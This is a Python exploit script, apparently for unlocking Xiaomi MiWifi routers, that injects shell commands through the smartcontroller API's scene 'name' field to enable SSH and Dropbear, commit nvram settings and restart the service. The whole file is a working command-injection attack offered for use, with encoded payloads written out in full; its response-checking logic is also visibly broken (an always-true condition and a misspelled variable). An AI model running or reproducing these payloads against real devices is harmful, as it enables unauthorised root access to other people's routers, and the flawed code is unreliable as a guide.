#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2025-02-05
# @Author  : Sh1zuku
import requests
import sys

print('''
 $$$$$$\  $$$$$$$\  $$$$$$$$\       $$\   $$\        $$$$$$\  $$\   $$\ 
$$  __$$\ $$  __$$\ $$  _____|      $$ |  $$ |      $$  __$$\ $$ | $$  |
$$ /  $$ |$$ |  $$ |$$ |            $$ |  $$ |      $$ /  $$ |$$ |$$  / 
$$$$$$$$ |$$$$$$$  |$$$$$\          $$ |  $$ |      $$ |  $$ |$$$$$  /  
$$  __$$ |$$  __$$< $$  __|         $$ |  $$ |      $$ |  $$ |$$  $$<   
$$ |  $$ |$$ |  $$ |$$ |            $$ |  $$ |      $$ |  $$ |$$ |\$$\  
$$ |  $$ |$$ |  $$ |$$$$$$$$\       \$$$$$$  |       $$$$$$  |$$ | \$$\ 
\__|  \__|\__|  \__|\________|       \______/        \______/ \__|  \__|
                                                                        
                                                                        
                                                                        ''')
print("MiWifi-NoodControllerInject @Sh1zuku")


def inject(ip, stok):
    base_url = f"http://{ip}/cgi-bin/luci/;stok={stok}"
    payloads = [
        # [Describe, GET/POST, Check, URL, Data]
        ["Set Time", 0, 0, "/api/misystem/set_sys_time?time=2023-2-19%2023:4:47&timezone=CST-8", ""],
        ["Unlock Dropbear", 1, 0, "/api/xqsmarthome/request_smartcontroller", "payload=%7B%22command%22%3A%22scene_setting%22%2C%22name%22%3A%22'%24(sed%20-i%20s%2Frelease%2FXXXXXX%2Fg%20%2Fetc%2Finit.d%2Fdropbear)'%22%2C%22action_list%22%3A%5B%7B%22thirdParty%22%3A%22xmrouter%22%2C%22delay%22%3A17%2C%22type%22%3A%22wan_block%22%2C%22payload%22%3A%7B%22command%22%3A%22wan_block%22%2C%22mac%22%3A%2200%3A00%3A00%3A00%3A00%3A00%22%7D%7D%5D%2C%22launch%22%3A%7B%22timer%22%3A%7B%22time%22%3A%223%3A1%22%2C%22repeat%22%3A%220%22%2C%22enabled%22%3Atrue%7D%7D%7D"],
        ["", 1, 0, "/api/xqsmarthome/request_smartcontroller", "payload=%7B%22command%22%3A%22scene_start_by_crontab%22%2C%22time%22%3A%223%3A1%22%2C%22week%22%3A0%7D"],
        ["Enable SSH", 1, 0, "/api/xqsmarthome/request_smartcontroller", "payload=%7B%22command%22%3A%22scene_setting%22%2C%22name%22%3A%22'%24(nvram%20set%20ssh_en%3D1)'%22%2C%22action_list%22%3A%5B%7B%22thirdParty%22%3A%22xmrouter%22%2C%22delay%22%3A17%2C%22type%22%3A%22wan_block%22%2C%22payload%22%3A%7B%22command%22%3A%22wan_block%22%2C%22mac%22%3A%2200%3A00%3A00%3A00%3A00%3A00%22%7D%7D%5D%2C%22launch%22%3A%7B%22timer%22%3A%7B%22time%22%3A%223%3A2%22%2C%22repeat%22%3A%220%22%2C%22enabled%22%3Atrue%7D%7D%7D"],
        ["", 1, 0, "/api/xqsmarthome/request_smartcontroller", "payload=%7B%22command%22%3A%22scene_start_by_crontab%22%2C%22time%22%3A%223%3A2%22%2C%22week%22%3A0%7D"],
        ["Commit NVram", 1, 0, "/api/xqsmarthome/request_smartcontroller", "payload=%7B%22command%22%3A%22scene_setting%22%2C%22name%22%3A%22'%24(nvram%20commit)'%22%2C%22action_list%22%3A%5B%7B%22thirdParty%22%3A%22xmrouter%22%2C%22delay%22%3A17%2C%22type%22%3A%22wan_block%22%2C%22payload%22%3A%7B%22command%22%3A%22wan_block%22%2C%22mac%22%3A%2200%3A00%3A00%3A00%3A00%3A00%22%7D%7D%5D%2C%22launch%22%3A%7B%22timer%22%3A%7B%22time%22%3A%223%3A3%22%2C%22repeat%22%3A%220%22%2C%22enabled%22%3Atrue%7D%7D%7D"],
        ["", 1, 0, "/api/xqsmarthome/request_smartcontroller", "payload=%7B%22command%22%3A%22scene_start_by_crontab%22%2C%22time%22%3A%223%3A3%22%2C%22week%22%3A0%7D"],
        ["Check SSH", 0, 1, "/api/xqsystem/fac_info", ""],
        ["Enable Dropbear", 1, 0, "/api/xqsmarthome/request_smartcontroller", "payload=%7B%22command%22%3A%22scene_setting%22%2C%22name%22%3A%22'%24(%2Fetc%2Finit.d%2Fdropbear%20enable)'%22%2C%22action_list%22%3A%5B%7B%22thirdParty%22%3A%22xmrouter%22%2C%22delay%22%3A17%2C%22type%22%3A%22wan_block%22%2C%22payload%22%3A%7B%22command%22%3A%22wan_block%22%2C%22mac%22%3A%2200%3A00%3A00%3A00%3A00%3A00%22%7D%7D%5D%2C%22launch%22%3A%7B%22timer%22%3A%7B%22time%22%3A%223%3A4%22%2C%22repeat%22%3A%220%22%2C%22enabled%22%3Atrue%7D%7D%7D"],
        ["", 1, 0, "/api/xqsmarthome/request_smartcontroller", "payload=%7B%22command%22%3A%22scene_start_by_crontab%22%2C%22time%22%3A%223%3A4%22%2C%22week%22%3A0%7D"],
        ["Restart Dropbear", 1, 0, "/api/xqsmarthome/request_smartcontroller", "payload=%7B%22command%22%3A%22scene_setting%22%2C%22name%22%3A%22'%24(%2Fetc%2Finit.d%2Fdropbear%20restart)'%22%2C%22action_list%22%3A%5B%7B%22thirdParty%22%3A%22xmrouter%22%2C%22delay%22%3A17%2C%22type%22%3A%22wan_block%22%2C%22payload%22%3A%7B%22command%22%3A%22wan_block%22%2C%22mac%22%3A%2200%3A00%3A00%3A00%3A00%3A00%22%7D%7D%5D%2C%22launch%22%3A%7B%22timer%22%3A%7B%22time%22%3A%223%3A5%22%2C%22repeat%22%3A%220%22%2C%22enabled%22%3Atrue%7D%7D%7D"],
        ["", 1, 0, "/api/xqsmarthome/request_smartcontroller", "payload=%7B%22command%22%3A%22scene_start_by_crontab%22%2C%22time%22%3A%223%3A5%22%2C%22week%22%3A0%7D"]
    ]
    for payload in payloads:
        response = ""
        url = base_url + payload[3]
        if payload[0]:
            print(payload[0])
        try:
            if payload[1] == 0: # GET
                response = requests.get(url)
            else: # POST
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                response = requests.post(url, data=payload[4], headers=headers)
            response = response.json()
            print(response)
            if response['code'] == 401 or 3001: # Unauthorized
                print("Fatal: invalid stok token!!!")
                exit()
            elif response['code'] == -100:
                print("Fatal: failed to connect to smartcontroller service, maybe there is no vulnerability.")
                exit()
            elif "ssh" in resopnse:
                if response['ssh']:
                    print("SSH access has granted!")
                else:
                    print("Fatal: failed to grant SSH access, maybe there is no vulnerability.")
                    exit()
            else:
                print(f"Fatal: unknown error {response['message']}")
                exit()
        except Exception as e:
            print("Encountered exception", e)
        print("Now you have the fucking control!")

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} IP stok")
    else:
        inject(sys.argv[1], sys.argv[2])

if __name__ == "__main__":
    main()
